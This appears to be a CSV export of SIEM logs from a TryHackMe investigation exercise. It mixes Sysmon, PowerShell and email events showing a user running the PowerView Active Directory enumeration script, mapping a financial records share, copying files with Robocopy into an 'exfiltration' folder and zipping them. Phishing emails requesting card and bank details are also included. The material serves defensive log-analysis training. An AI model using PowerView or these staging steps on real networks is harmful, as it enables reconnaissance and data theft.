"NnV6ypsB8mE-0EyZo3_e","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3458","-","-","-","-","-","""C:\Windows\System32\Sethc.exe"" /AccessibilitySoundAgent","sethc.exe","AtBroker.exe",3846,3721,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:40.304","-"
"JnV5ypsB8mE-0EyZ5H9b","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip","win-3450","-","-","-","-","-","-","powershell.exe","-","-",3728,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:22.304","-"
"JXV5ypsB8mE-0EyZ0H_v","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3452","-","-","-","-","-","-","spoolsv.exe","-","-",3524,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{9A7D6000-6360-4067-AFEC-3F8722701AC5}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{9A7D6000-6360-4067-AFEC-3F8722701AC5}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:42:19.304","-"
"I3V5ypsB8mE-0EyZwX85","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\net.exe"" use Z: /delete","net.exe","powershell.exe",3728,8004,"C:\Users\michael.ascot\downloads\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:04.304","-"
"JHV5ypsB8mE-0EyZzH_u","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\Robocopy.exe"" . C:\Users\michael.ascot\downloads\exfiltration /E","Robocopy.exe","powershell.exe","3,728",8356,"Z:\","-","-","-","-","-","-","Jan 17, 2026 @ 02:41:53.304","-"
"KHV6ypsB8mE-0EyZC397","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\Downloads\exfiltration\InvestorPresentation2023.pptx","win-3450","-","-","-","-","-","-","Robocopy.exe","-","-",8356,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:41:53.304","-"
"J3V6ypsB8mE-0EyZB3-d","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\Downloads\exfiltration\ClientPortfolioSummary.xlsx","win-3450","-","-","-","-","-","-","Robocopy.exe","-","-",8356,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:41:53.304","-"
"HnV5ypsB8mE-0EyZNH-_","-",logs,"-",None,"I’m on my way. What’s the agenda?",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","contact@tryhatme.com","RE: MEETING NOW!","Jan 17, 2026 @ 02:41:40.304","-"
"IXV5ypsB8mE-0EyZen_b","-",logs,"-",None," Done! Some interesting points in there.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","contact@tryhatme.com","RE: Hat-titude Check: Employee Feedback Survey","Jan 17, 2026 @ 02:41:34.304","-"
"InV5ypsB8mE-0EyZvX9N","-",logs,"-",None," Travel the world to explore the most exotic hat cultures Only available to the first 1000 people who enter their credit card details",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","stark@styleinfluencerhub.info","-","-","-","cain.omoore@tryhatme.com","Exotic Hat Destination Package Limited Time Offer Inside","Jan 17, 2026 @ 02:41:25.304","-"
"HHV4ypsB8mE-0EyZ6X9n","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\net.exe"" use Z: \\FILESRV-01\SSF-FinancialRecords","net.exe","powershell.exe",3728,5784,"C:\Users\michael.ascot\downloads\","-","-","-","-","-","-","Jan 17, 2026 @ 02:41:06.304","-"
"HXV5ypsB8mE-0EyZDX-8","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3459","-","-","-","-","-","""C:\Windows\System32\Sethc.exe"" /AccessibilitySoundAgent","sethc.exe","AtBroker.exe",3531,3846,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:41:06.304","-"
"IHV5ypsB8mE-0EyZU3_R","-",logs,"-",None," Please review and confirm availability for the proposed meeting time",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","aamir@headwearreporter.net","-","-","-","safa.prince@tryhatme.com","FWD: Scheduling a Virtual Meeting to Discuss Market Trends","Jan 17, 2026 @ 02:41:00.304","-"
"H3V5ypsB8mE-0EyZQH-v","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\Downloads\exfiltration","win-3450","-","-","-","-","-","-","powershell.exe","-","-",3728,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:40:59.304","-"
"G3V4ypsB8mE-0EyZu3-j","-",logs,"-",None," The new material samples look promising I am particularly interested in the eco friendly options",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","edna@fashionforwardhatter.com","-","-","-","safa.prince@tryhatme.com","RE: Vendor Showcase: Latest Hat Materials and Designs","Jan 17, 2026 @ 02:40:36.304","-"
"GnV4ypsB8mE-0EyZlH9x","-",logs,"-",None," Forwarding this invitation to the recruitment team for scheduling",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","howe@hatemporium.com","-","-","-","invoice@tryhatme.com","FWD: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:40:24.304","-"
"FnV4ypsB8mE-0EyZE3_b","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3449","-","-","-","-","-","-","spoolsv.exe","-","-",3901,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:40:23.304","-"
"F3V4ypsB8mE-0EyZQn-F","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3451","-","-","-","-","-","taskhostw.exe KEYROAMING","taskhostw.exe","svchost.exe",3531,3870,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:40:22.304","-"
"GXV4ypsB8mE-0EyZjH-2","-",logs,"-",None," Forwarding this update to the team for review and alignment",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","oneal@hatstyleinfluencer.net","-","-","-","roger.fedora@tryhatme.com","FWD: Follow-up on Previous Discussion: Next Steps for Engagement","Jan 17, 2026 @ 02:40:10.304","-"
"GHV4ypsB8mE-0EyZZX_O","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (1 of 1):{                    $Up = $True                    if($Ping) {                        # TODO: how can these results be piped to ping for a speedup?                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname                    }                    if($Up) {                        # return full data objects                        if ($FullData) {                            # convert/process the LDAP fields for each result                            Convert-LDAPProperty -Properties $_.Properties                        }                        else {                            # otherwise we're just returning the DNS host name                            $_.properties.dnshostname                        }                    }                }ScriptBlock ID: fe1b8559-938b-4c36-8c28-1e3bc2cf7039Path: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","{                    $Up = $True                    if($Ping) {                        # TODO: how can these results be piped to ping for a speedup?                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname                    }                    if($Up) {                        # return full data objects                        if ($FullData) {                            # convert/process the LDAP fields for each result                            Convert-LDAPProperty -Properties $_.Properties                        }                        else {                            # otherwise we're just returning the DNS host name                            $_.properties.dnshostname                        }                    }                }","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:40:00.304","3,728"
"EHV3ypsB8mE-0EyZ5H-j","-",logs,"-",None," Wear our scientifically unproven hat and lose weight overnight It works because we said so",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","safa.prince@tryhatme.com","-","-","-","cotton@styleiconsinfluencers.net","Magic Weight Loss Hat Pills Shed Pounds Instantly","Jan 17, 2026 @ 02:39:59.304","-"
"C3V3ypsB8mE-0EyZ0X8g","-",logs,"-",None," Launch day is approaching—let’s make sure everything is in place.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","miguel.odonnell@tryhatme.com","-","-","-","miguel.odonnell@tryhatme.com","New Product Launch - All Hands on Deck","Jan 17, 2026 @ 02:39:56.304","-"
"FXV4ypsB8mE-0EyZB3_n","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3459","-","-","-","-","-","""LogonUI.exe"" /flags:0x0 /state0:0xb5731855 /state1:0x41c64e6d","LogonUI.exe","winlogon.exe",3821,3532,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:52.304","-"
"_XV3ypsB8mE-0EyZWH4A","-",logs,"-",None," Join the hidden world of ancient hat wearers and learn the lost secrets of headwear enlightenment All we need is your bank account details",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","warner@chicfashionbloggers.net","-","-","-","armaan.terry@tryhatme.com","Unlock Ancient Hat Secrets with This Ancient Pyramid Scheme","Jan 17, 2026 @ 02:39:34.304","-"
"EXV3ypsB8mE-0EyZ6H-M","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (4 of 26):se {                $Wpad = """"            }                        if($ProxyServer -or $AutoConfigUrl) {                $Properties = @{                    'ProxyServer' = $ProxyServer                    'AutoConfigURL' = $AutoConfigURL                    'Wpad' = $Wpad                }                                New-Object -TypeName PSObject -Property $Properties            }            else {                Write-Warning ""No proxy settings found for $ComputerName""            }        }        catch {            Write-Warning ""Error enumerating proxy settings for $ComputerName""        }    }}function Get-PathAcl {    [CmdletBinding()]    param(        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]        [string]        $Path,        [Switch]        $Recurse    )    begin {        function Convert-FileRight {            # From http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights            [CmdletBinding()]            param(                [Int]                $FSR            )            $AccessMask = @{              [uint32]'0x80000000' = 'GenericRead'              [uint32]'0x40000000' = 'GenericWrite'              [uint32]'0x20000000' = 'GenericExecute'              [uint32]'0x10000000' = 'GenericAll'              [uint32]'0x02000000' = 'MaximumAllowed'              [uint32]'0x01000000' = 'AccessSystemSecurity'              [uint32]'0x00100000' = 'Synchronize'              [uint32]'0x00080000' = 'WriteOwner'              [uint32]'0x00040000' = 'WriteDAC'              [uint32]'0x00020000' = 'ReadControl'              [uint32]'0x00010000' = 'Delete'              [uint32]'0x00000100' = 'WriteAttributes'              [uint32]'0x00000080' = 'ReadAttributes'              [uint32]'0x00000040' = 'DeleteChild'              [uint32]'0x00000020' = 'Execute/Traverse'              [uint32]'0x00000010' = 'WriteExtendedAttributes'              [uint32]'0x00000008' = 'ReadExtendedAttributes'              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'              [uint32]'0x00000002' = 'WriteData/AddFile'              [uint32]'0x00000001' = 'ReadData/ListDirectory'            }            $SimplePermissions = @{              [uint32]'0x1f01ff' = 'FullControl'              [uint32]'0x0301bf' = 'Modify'              [uint32]'0x0200a9' = 'ReadAndExecute'              [uint32]'0x02019f' = 'ReadAndWrite'              [uint32]'0x020089' = 'Read'              [uint32]'0x000116' = 'Write'            }            $Permissions = @()            # get simple permission            $Permissions += $SimplePermissions.Keys |  % {                              if (($FSR -band $_) -eq $_) {                                $SimplePermissions[$_]                                $FSR = $FSR -band (-not $_)                              }                            }            # get remaining extended permissions            $Permissions += $AccessMask.Keys |                            ? { $FSR -band $_ } |                            % { $AccessMask[$_] }            ($Permissions | ?{$_}) -join "",""        }    }    process {        try {            $ACL = Get-Acl -Path $Path            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {                $Names = @()                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {                    $Object = Get-ADObject -SID $_.IdentityReference                    $Names = @()                    $SIDs = @($Object.objectsid)                    if ($Recurse -and ($Object.samAccountType -ne ""805306368"")) {                        $SIDs += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid                    }                    $SIDs | ForEach-Object {                        $Names += ,@($_, (Convert-SidToName $_))                    }                }                else {                    $Names += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))                }                ForEach($Name in $Names) {                    $Out = New-Object PSObject                    $Out | Add-Member Noteproperty 'Path' $Path                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)                    $Out | Add-Member Noteproperty 'IdentityReference' $Name[1]                    $Out | Add-Member Noteproperty 'IdentitySID' $Name[0]                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType                    $Out                }            }        }        catch {            Write-Warning $_        }    }}function Get-NameField {    # function that attempts to extract the appropriate field name    # from various passed objects. This is so functions can have    # multiple types of objects passed on the pipeline.    [CmdletBinding()]    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        $Object    )    process {        if($Object) {            if ( [bool]($Object.PSobject.Properties.name -match ""dnshostname"") ) {                # objects from Get-NetComputer                $Object.dnshostname            }            elseif ( [bool]($Object.PSobject.Properties.name -match ""name"") ) {                # objects from Get-NetDomainController                $Object.name            }            else {                # strings and catch alls                $Object            }        }        else {            return $Null        }    }}function Convert-LDAPProperty {    # helper to convert specific LDAP property result fields    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        [ValidateNotNullOrEmpty()]        $Properties    )    $ObjectProperties = @{}    $Properties.PropertyNames | ForEach-Object {        if (($_ -eq ""objectsid"") -or ($_ -eq ""sidhistory"")) {            # convert the SID to a string            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value        }        elseif($_ -eq ""objectguid"") {            # convert the GUID to a string            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid        }        elseif( ($_ -eq ""lastlogon"") -or ($_ -eq ""lastlogontimestamp"") -or ($_ -eq ""pwdlastset"") -or ($_ -eq ""lastlogoff"") -or ($_ -eq ""badPasswordTime"") ) {            # convert timestamps            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {                # if we have a System.__ComObject                $Temp = $Properties[$_][0]                [Int32]$High = $Temp.GetType().InvokeMember(""HighPart"", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)                [Int32]$Low  = $Temp.GetType().InvokeMember(""LowPart"",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64](""0x{0:x8}{1:x8}"" -f $High, $Low)))            }            else {                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))            }        }        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {            # convert misc com objects            $Prop = $Properties[$_]            try {                $Temp = $Prop[$_][0]                Write-Verbose $_                [Int32]$High = $Temp.GetType().InvokeMember(""HighPart"", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)                [Int32]$Low  = $Temp.GetType().InvokeMember(""LowPart"",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)                $ObjectProperties[$_] = [Int64](""0x{0:x8}{1:x8}"" -f $High, $Low)            }            catch {                $ObjectProperties[$_] = $Prop[$_]            }        }        elseif($Properties[$_].count -eq 1) {            $ObjectProperties[$_] = $Properties[$_][0]        }        else {            $ObjectProperties[$_] = $Properties[$_]        }    }    New-Object -TypeName PSObject -Property $ObjectProperties}########################################################## Domain info functions below.#########################################################function Get-DomainSearcher {<#    .SYNOPSIS        Helper used by various functions that takes an ADSpath and        domain specifier and builds the correct ADSI searcher object.    .PARAMETER Domain        The domain to use for the query, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER ADSprefix        Prefix to set for the searcher (like ""CN=Sites,CN=Configuration"")    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-DomainSearcher -Domain testlab.local    .EXAMPLE        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local#>    [CmdletBinding()]    param(        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [String]        $ADSprefix,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    if(!$Domain) {        $Domain = (Get-NetDomain).name    }    else {        if(!$DomainController) {            try {                # if there's no -DomainController specified, try to pull the primary DC                #   to reflect queries through                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name            }            catch {                throw ""Get-DomainSearcher: Error in retrieving PDC for current domain""            }        }    }    $SearchString = ""LDAP://""    if($DomainController) {        $SearchString += $DomainController + ""/""    }    if($ADSprefix) {        $SearchString += $ADSprefix + "",""    }    if($ADSpath) {        if($ADSpath -like ""GC://*"") {            # if we're searching the global catalog            $DistinguishedName = $AdsPath            $SearchString = """"        }        else {            if($ADSpath -like ""LDAP://*"") {                $ADSpath = $ADSpath.Substring(7)            }            $DistinguishedName = $ADSpath        }    }    else {        $DistinguishedName = ""DC=$($Domain.Replace('.', ',DC='))""    }    $SearchString += $DistinguishedName    Write-Verbose ""Get-DomainSearcher search string: $SearchString""    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)    $Searcher.PageSize = $PageSize    $Searcher}function Get-NetDomain {<#    .SYNOPSIS        Returns a given domain object.    .PARAMETER Domain        The domain name to query for, defaults to the current domain.    .EXAMPLE        PS C:\> Get-NetDomain -Domain testlab.local    .LINK        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $Domain    )    process {        if($Domain) {            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)            try {                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)            }            catch {                Write-Warning ""The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust.""                $Null            }        }        else {            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()        }    }}function Get-NetForest {<#    .SYNOPSIS        Returns a given forest object.    .PARAMETER Forest        The forest name to query for, defaults to the current domain.    .EXAMPLE            PS C:\> Get-NetForest -Forest external.domain#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $Forest    )    process {        if($Forest) {            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)            try {                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)            }            catch {                Write-Debug ""The specified forest $Forest does not exist, could not be contacted, or there isn't an existing trust.""                $Null            }        }        else {            # otherwise use the current forest            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()        }        if($ForestObject) {            # get the SID of the forest root            $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,""krbtgt"")).Translate([System.Security.Principal.SecurityIdentifier]).Value            $Parts = $ForestSid -Split ""-""            $ForestSid = $Parts[0..$($Parts.length-2)] -join ""-""            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid            $ForestObject        }    }}function Get-NetForestDomain {<#    .SYNOPSIS        Return all domains for a given forest.    .PARAMETER Forest        The forest name to query domain for.    .PARAMETER Domain        Return domains that match this term/wildcard.    .EXAMPLE        PS C:\> Get-NetForestDomain    .EXAMPLE        PS C:\> Get-NetForestDomain -Forest external.local#>    [CmdletBinding()]    pScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","se {                $Wpad = """"            }                        if($ProxyServer -or $AutoConfigUrl) {                $Properties = @{                    'ProxyServer' = $ProxyServer                    'AutoConfigURL' = $AutoConfigURL                    'Wpad' = $Wpad                }                                New-Object -TypeName PSObject -Property $Properties            }            else {                Write-Warning ""No proxy settings found for $ComputerName""            }        }        catch {            Write-Warning ""Error enumerating proxy settings for $ComputerName""        }    }}function Get-PathAcl {    [CmdletBinding()]    param(        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]        [string]        $Path,        [Switch]        $Recurse    )    begin {        function Convert-FileRight {            # From http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights            [CmdletBinding()]            param(                [Int]                $FSR            )            $AccessMask = @{              [uint32]'0x80000000' = 'GenericRead'              [uint32]'0x40000000' = 'GenericWrite'              [uint32]'0x20000000' = 'GenericExecute'              [uint32]'0x10000000' = 'GenericAll'              [uint32]'0x02000000' = 'MaximumAllowed'              [uint32]'0x01000000' = 'AccessSystemSecurity'              [uint32]'0x00100000' = 'Synchronize'              [uint32]'0x00080000' = 'WriteOwner'              [uint32]'0x00040000' = 'WriteDAC'              [uint32]'0x00020000' = 'ReadControl'              [uint32]'0x00010000' = 'Delete'              [uint32]'0x00000100' = 'WriteAttributes'              [uint32]'0x00000080' = 'ReadAttributes'              [uint32]'0x00000040' = 'DeleteChild'              [uint32]'0x00000020' = 'Execute/Traverse'              [uint32]'0x00000010' = 'WriteExtendedAttributes'              [uint32]'0x00000008' = 'ReadExtendedAttributes'              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'              [uint32]'0x00000002' = 'WriteData/AddFile'              [uint32]'0x00000001' = 'ReadData/ListDirectory'            }            $SimplePermissions = @{              [uint32]'0x1f01ff' = 'FullControl'              [uint32]'0x0301bf' = 'Modify'              [uint32]'0x0200a9' = 'ReadAndExecute'              [uint32]'0x02019f' = 'ReadAndWrite'              [uint32]'0x020089' = 'Read'              [uint32]'0x000116' = 'Write'            }            $Permissions = @()            # get simple permission            $Permissions += $SimplePermissions.Keys |  % {                              if (($FSR -band $_) -eq $_) {                                $SimplePermissions[$_]                                $FSR = $FSR -band (-not $_)                              }                            }            # get remaining extended permissions            $Permissions += $AccessMask.Keys |                            ? { $FSR -band $_ } |                            % { $AccessMask[$_] }            ($Permissions | ?{$_}) -join "",""        }    }    process {        try {            $ACL = Get-Acl -Path $Path            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {                $Names = @()                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {                    $Object = Get-ADObject -SID $_.IdentityReference                    $Names = @()                    $SIDs = @($Object.objectsid)                    if ($Recurse -and ($Object.samAccountType -ne ""805306368"")) {                        $SIDs += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid                    }                    $SIDs | ForEach-Object {                        $Names += ,@($_, (Convert-SidToName $_))                    }                }                else {                    $Names += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))                }                ForEach($Name in $Names) {                    $Out = New-Object PSObject                    $Out | Add-Member Noteproperty 'Path' $Path                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)                    $Out | Add-Member Noteproperty 'IdentityReference' $Name[1]                    $Out | Add-Member Noteproperty 'IdentitySID' $Name[0]                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType                    $Out                }            }        }        catch {            Write-Warning $_        }    }}function Get-NameField {    # function that attempts to extract the appropriate field name    # from various passed objects. This is so functions can have    # multiple types of objects passed on the pipeline.    [CmdletBinding()]    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        $Object    )    process {        if($Object) {            if ( [bool]($Object.PSobject.Properties.name -match ""dnshostname"") ) {                # objects from Get-NetComputer                $Object.dnshostname            }            elseif ( [bool]($Object.PSobject.Properties.name -match ""name"") ) {                # objects from Get-NetDomainController                $Object.name            }            else {                # strings and catch alls                $Object            }        }        else {            return $Null        }    }}function Convert-LDAPProperty {    # helper to convert specific LDAP property result fields    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        [ValidateNotNullOrEmpty()]        $Properties    )    $ObjectProperties = @{}    $Properties.PropertyNames | ForEach-Object {        if (($_ -eq ""objectsid"") -or ($_ -eq ""sidhistory"")) {            # convert the SID to a string            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value        }        elseif($_ -eq ""objectguid"") {            # convert the GUID to a string            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid        }        elseif( ($_ -eq ""lastlogon"") -or ($_ -eq ""lastlogontimestamp"") -or ($_ -eq ""pwdlastset"") -or ($_ -eq ""lastlogoff"") -or ($_ -eq ""badPasswordTime"") ) {            # convert timestamps            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {                # if we have a System.__ComObject                $Temp = $Properties[$_][0]                [Int32]$High = $Temp.GetType().InvokeMember(""HighPart"", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)                [Int32]$Low  = $Temp.GetType().InvokeMember(""LowPart"",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64](""0x{0:x8}{1:x8}"" -f $High, $Low)))            }            else {                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))            }        }        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {            # convert misc com objects            $Prop = $Properties[$_]            try {                $Temp = $Prop[$_][0]                Write-Verbose $_                [Int32]$High = $Temp.GetType().InvokeMember(""HighPart"", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)                [Int32]$Low  = $Temp.GetType().InvokeMember(""LowPart"",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)                $ObjectProperties[$_] = [Int64](""0x{0:x8}{1:x8}"" -f $High, $Low)            }            catch {                $ObjectProperties[$_] = $Prop[$_]            }        }        elseif($Properties[$_].count -eq 1) {            $ObjectProperties[$_] = $Properties[$_][0]        }        else {            $ObjectProperties[$_] = $Properties[$_]        }    }    New-Object -TypeName PSObject -Property $ObjectProperties}########################################################## Domain info functions below.#########################################################function Get-DomainSearcher {<#    .SYNOPSIS        Helper used by various functions that takes an ADSpath and        domain specifier and builds the correct ADSI searcher object.    .PARAMETER Domain        The domain to use for the query, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER ADSprefix        Prefix to set for the searcher (like ""CN=Sites,CN=Configuration"")    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-DomainSearcher -Domain testlab.local    .EXAMPLE        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local#>    [CmdletBinding()]    param(        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [String]        $ADSprefix,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    if(!$Domain) {        $Domain = (Get-NetDomain).name    }    else {        if(!$DomainController) {            try {                # if there's no -DomainController specified, try to pull the primary DC                #   to reflect queries through                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name            }            catch {                throw ""Get-DomainSearcher: Error in retrieving PDC for current domain""            }        }    }    $SearchString = ""LDAP://""    if($DomainController) {        $SearchString += $DomainController + ""/""    }    if($ADSprefix) {        $SearchString += $ADSprefix + "",""    }    if($ADSpath) {        if($ADSpath -like ""GC://*"") {            # if we're searching the global catalog            $DistinguishedName = $AdsPath            $SearchString = """"        }        else {            if($ADSpath -like ""LDAP://*"") {                $ADSpath = $ADSpath.Substring(7)            }            $DistinguishedName = $ADSpath        }    }    else {        $DistinguishedName = ""DC=$($Domain.Replace('.', ',DC='))""    }    $SearchString += $DistinguishedName    Write-Verbose ""Get-DomainSearcher search string: $SearchString""    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)    $Searcher.PageSize = $PageSize    $Searcher}function Get-NetDomain {<#    .SYNOPSIS        Returns a given domain object.    .PARAMETER Domain        The domain name to query for, defaults to the current domain.    .EXAMPLE        PS C:\> Get-NetDomain -Domain testlab.local    .LINK        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $Domain    )    process {        if($Domain) {            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)            try {                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)            }            catch {                Write-Warning ""The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust.""                $Null            }        }        else {            